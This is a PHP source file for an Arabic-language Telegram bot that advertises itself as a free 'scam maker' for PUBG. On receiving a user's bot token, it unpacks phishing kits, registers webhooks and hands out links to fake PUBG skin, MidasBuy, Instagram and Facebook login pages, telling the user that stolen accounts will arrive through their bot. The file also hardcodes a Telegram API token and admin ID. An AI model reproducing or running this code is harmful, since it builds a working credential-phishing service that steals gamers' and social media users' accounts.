<?php

ob_start();
$API_KEY = '5832297455:AAHRohMYz81QnxGnjWwR0Pm8cmUqPvU5nUk';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}

#هنا حط رابط الاستضافه   والايدي 
$weeeb = "https://bot-c60061.ingress-earth.ewp.live/index";
$admin_id = '5011123303';
include "admin.php";


$update         = json_decode(file_get_contents('php://input'));
$message        = $update->message;
$text           = $message->text;
$data           = $update->callback_query->data;
$user           = $update->message->from->username;
$user2          = $update->callback_query->from->username;
$name           = $update->message->from->first_name;
$name2          = $update->callback_query->from->first_name;
$message_id     = $message->message_id;
$message_id2    = $update->callback_query->message->message_id;
$chat_id        = $message->chat->id;
$chat_id2       = $update->callback_query->message->chat->id;
$from_id        = $message->from->id;
$from_id2       = $update->callback_query->message->from->id;
$info_token     = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); 

$info_tokens    = json_decode($info_token);

$get_done_spin  = file_get_contents('infos/explod_spin.txt');
$done_spin      = explode("\n",$get_done_spin);

$get_id         = file_get_contents('infos/info.txt'); 
$get_ids        = explode("\n", $get_id);
$index          = "<html><meta HTTP-EQUIV='REFRESH' content='0; url=https://t.me/Houassff_bot/></html>";
$spin_ma        = file_get_contents("data/$from_id/spin_ma.txt");


mkdir("infos");
mkdir("PUBG");
mkdir("data");
mkdir("insta");
mkdir("facebook");

if($text == '/start'){ 
    
mkdir("data/$from_id");
mkdir("PUBG/$from_id");
mkdir("insta/$from_id");
mkdir("facebook/$from_id");

if(!is_dir("PUBG/$from_id")){
    mkdir("PUBG/$from_id");
}
if(!is_dir("insta/$from_id")){
    mkdir("insta/$from_id");
}
if(!is_dir("facebook/$from_id")){
    mkdir("facebook/$from_id");
}
if(!is_dir("data/$from_id")){
    mkdir("data/$from_id");
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
♣︎ مرحباً بك في أفضل بوت صانع سكامة 🪙

♧ يقوم البوت بإنشاء سكامة ببجي مجاناً لك 🧾

♣︎ كل ماعليك استخدام الكيبورد الذي في الاسفل ⬇️ ⌨
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'● انشاء سكامة 💳',],['text'=>'○ حذف السكامة 🚽',]],
[['text'=>'♠︎ روابط السكامة ⛓',]],
[['text'=>'♤ تحديث البوت 🩺',]],
],'resize_keyboard'=>true,
])
]);
}


if($text == '- رجوع ⏮' or $text == "-  رجوع ⏮" or $text == "• رجوع ⏮"){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
♣︎ مرحباً بك في أفضل بوت صانع سكامة 🪙

♧ يقوم البوت بإنشاء سكامة ببجي مجاناً لك 🧾

♣︎ كل ماعليك استخدام الكيبورد الذي في الاسفل ⬇️ ⌨
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'● انشاء سكامة 💳',],['text'=>'○ حذف السكامة 🚽',]],
[['text'=>'♠︎ روابط السكامة ⛓',]],
[['text'=>'♤ تحديث البوت 🩺',]],
],'resize_keyboard'=>true,
])
]);
unlink("data/$from_id/spin_ma.txt");
}





if($text == '● انشاء سكامة 💳' and in_array($chat_id,$done_spin)){ 
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- لا يمكنك انشاء اكثر من رابط من كل شكل ⁉️",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}

if($text == '● انشاء سكامة 💳' and !in_array($from_id,$done_spin)){ 
file_put_contents("data/$from_id/spin_ma.txt", "make");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- سكامة جديدة و اشكال ممكشوفه

- فقط ارسل التوكن الخاص بك 🎟 
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}

if($text and $spin_ma == "make" and $info_tokens->ok != "true"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- عذراً التوكن الذي ارسلته غير صالح ⁉️\".",
'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true,])
]);
}

if($text and $spin_ma == "make" and $info_tokens->ok == "true"){
if(!is_dir("PUBG/$from_id")){
    mkdir("PUBG/$from_id");
}
if(!is_dir("insta/$from_id")){
    mkdir("insta/$from_id");
}
if(!is_dir("data/$from_id")){
    mkdir("data/$from_id");
}
file_put_contents("data/$from_id/spin_ma.txt", "null");
mkdir("PUBG/$from_id/1");
file_put_contents("PUBG/$from_id/1/Token.txt","$text");
file_put_contents("PUBG/$from_id/1/Id.txt","$from_id");
$str       = str_replace($from_id, '', $get_id);
file_put_contents('infos/info.txt', $str);   
file_put_contents("insta/$from_id/Id.txt","$from_id");
file_put_contents("insta/$from_id/Token.txt","$text");
$Token     = file_get_contents("PUBG/$from_id/2/Token.txt");
file_put_contents("PUBG/$from_id/2/Token.txt","$Token\n$from_id");

    mkdir("PUBG/$from_id/2");
    file_put_contents("PUBG/$from_id/2/Token.txt","$text");
    file_put_contents("PUBG/$from_id/2/Id.txt","$from_id");
    $str       = str_replace($from_id, '', $get_id);
    file_put_contents('infos/info.txt', $str);   
    $Token     = file_get_contents("PUBG/$from_id/2/Token.txt");
    
  
  $zipspin = "Facebook.zip"; 
$zip = new ZipArchive;
if($zip->open($zipspin) === TRUE){
$zip->extractTo(__DIR__."/"."PUBG/$from_id/1"); 
$zip->close();    
}

$zipinsta = "insta.zip"; 
$zip = new ZipArchive;
if($zip->open($zipinsta) === TRUE){
$zip->extractTo(__DIR__."/"."insta/$from_id/"); 
$zip->close();    
}

$zipfacebook = "facebook.zip"; 
$zip = new ZipArchive;
if($zip->open($zipfacebook) === TRUE){
$zip->extractTo(__DIR__."/"."facebook/$from_id/"); 
$zip->close();    
}

$zipuc = "midasbuy.zip"; 
    $zip = new ZipArchive;
    if($zip->open($zipuc) === TRUE){
    $zip->extractTo(__DIR__."/"."PUBG/$from_id/2"); 
    $zip->close();    
    }
  
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/PUBG/$from_id/2/verification.php");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/insta/$from_id/verification.php");
    $url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;
    file_put_contents('infos/explod_uc.txt', $from_id . "\n", FILE_APPEND);  
  file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/PUBG/$from_id/1/verification.php");
$Token     = file_get_contents("PUBG/$from_id/1/Token.txt");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
$json_info = json_decode($url_info);
$userr     = $json_info->result->username;
file_put_contents('infos/explod_spin.txt', $from_id . "\n", FILE_APPEND);
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/facebook/$from_id/1/verification.php");
$Token     = file_get_contents("facebook/$from_id/1/Token.txt");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
$json_info = json_decode($url_info);
$userr     = $json_info->result->username;
file_put_contents('infos/explod_spin.txt', $from_id . "\n", FILE_APPEND);

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم إنشاء سكامة ببجي الخاصه بيك بنجاح  ✅ 

- هذه روابط  السكامة الخاصه بيك 🖇

• Suits-X -》

$weeeb/PUBG/$from_id/1/index.php ⚜️

• MidasBuy -》

$weeeb/PUBG/$from_id/2/index.php ⚜️


• INSTA -》

$weeeb/insta/$from_id/index.php ⚜️

• INSTA -》

$weeeb/facebook/$from_id/index.php ⚜️

- معرف البوتك الذي ستستلم به الحسابات 📮 

@$userr 🤖 

",
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],
'resize_keyboard'=>true,
])
]);
}



##


if($text == '○ حذف السكامة 🚽'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
☣ لحذف الروابط الخاصه بك يرجي تاكيد الحذف 🚫
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'⛔ تاكيد الحذف ❌',]],
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true,
])
]);
}


if($text == '⛔ تاكيد الحذف ❌' and in_array($from_id,$done_spin)){ 
    $str1 = str_replace($from_id, '',$done_spin);
    file_put_contents('infos/explod_spin.txt', $str1);
    unlink("PUBG/$from_id/1/verification.php");
    unlink("PUBG/$from_id/2/verification.php");
    unlink("insta/$from_id/verification.php");
    unlink("facebook/$from_id/verification.php");
    
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم حذف السكامة الخاصه بيك ⁉️.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}


if($text == '○ حذف السكامة 🚽' and !in_array($from_id,$done_spin)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- عذراً قم بإنشاء سكامة آولا ⁉️.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}


$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;


if($text == '♠︎ روابط السكامة ⛓' and in_array($from_id,$done_spin)){ 

bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
- هذا رابط  السكامة الخاص بيك 🖇


• Skin -》

$weeeb/PUBG/$from_id/1/index.php ⚜️

• MidasBuy -》

$weeeb/PUBG/$from_id/2/index.php ⚜️

• INSTA -》

$weeeb/insta/$from_id/index.php ⚜️


- معرف البوتك الذي ستستلم به الحسابات 📮 

@$userr 🤖 

",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}


if($text == '♠︎ روابط السكامة ⛓' and !in_array($from_id,$done_spin)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- عذراً قم بإنشاء سكامة من هذا النوع آولا ⁉️.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- رجوع ⏮',]],
],'resize_keyboard'=>true])]);}

if($text == '♤ تحديث البوت 🩺'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
♣︎ مرحباً بك في أفضل بوت صانع سكامة 🪙

♧ يقوم البوت بإنشاء سكامة ببجي مجاناً لك 🧾

♣︎ كل ماعليك استخدام الكيبورد الذي في الاسفل ⬇️ ⌨
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'● انشاء سكامة 💳',],['text'=>'○ حذف السكامة 🚽',]],
[['text'=>'♠︎ روابط السكامة ⛓',]],
[['text'=>'♤ تحديث البوت 🩺',]],
],'resize_keyboard'=>true])]);}
